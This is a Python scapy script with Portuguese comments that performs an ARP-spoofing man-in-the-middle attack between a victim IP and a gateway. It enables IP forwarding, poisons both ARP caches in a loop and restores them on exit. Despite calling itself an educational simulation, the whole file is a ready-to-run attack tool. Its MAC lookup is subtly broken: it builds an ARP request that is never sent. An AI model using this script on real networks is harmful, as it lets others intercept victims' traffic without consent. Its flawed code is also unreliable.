from scapy.all import ARP, Ether, send, sniff, conf
import os
import sys
import time

def enable_ip_forward():
    """Habilita o encaminhamento de pacotes IP no sistema."""
    if os.name == "posix":
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[+] Encaminhamento de pacotes IP ativado.")
    else:
        print("[-] Este script funciona apenas em sistemas baseados em Linux.")
        sys.exit(1)

def disable_ip_forward():
    """Desabilita o encaminhamento de pacotes IP no sistema."""
    if os.name == "posix":
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[+] Encaminhamento de pacotes IP desativado.")
    else:
        print("[-] Este script funciona apenas em sistemas baseados em Linux.")
        sys.exit(1)

def get_mac(ip):
    """Obtém o endereço MAC de um IP usando ARP."""
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered = sniff(count=1, filter="arp and arp[7] = 2", timeout=2, iface=conf.iface)
        return answered[0][ARP].hwsrc if answered else None
    except IndexError:
        print(f"[-] Não foi possível obter o MAC para {ip}")
        return None

def spoof(target_ip, spoof_ip):
    """Envia pacotes ARP para enganar a vítima."""
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)
    else:
        print(f"[-] Não foi possível realizar o spoofing em {target_ip}")

def restore(target_ip, source_ip):
    """Restaura a tabela ARP original."""
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if target_mac and source_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=4, verbose=False)

def sniff_packets():
    """Captura pacotes no modo de escuta."""
    print("[*] Capturando pacotes. Pressione CTRL+C para parar.")
    sniff(filter="ip", prn=lambda packet: packet.summary(), store=False)

def mitm(target_ip, gateway_ip):
    """Executa o ataque MITM."""
    enable_ip_forward()
    try:
        print("[*] Iniciando spoofing ARP. Pressione CTRL+C para interromper.")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Interrompendo ataque. Restaurando tabelas ARP...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        disable_ip_forward()
        print("[+] Tabelas ARP restauradas. Saindo.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Este script precisa ser executado como root.")
        sys.exit(1)

    import argparse

    parser = argparse.ArgumentParser(description="Simulação de MITM para fins educacionais.")
    parser.add_argument("target", help="IP da vítima.")
    parser.add_argument("gateway", help="IP do gateway.")
    args = parser.parse_args()

    mitm(args.target, args.gateway)
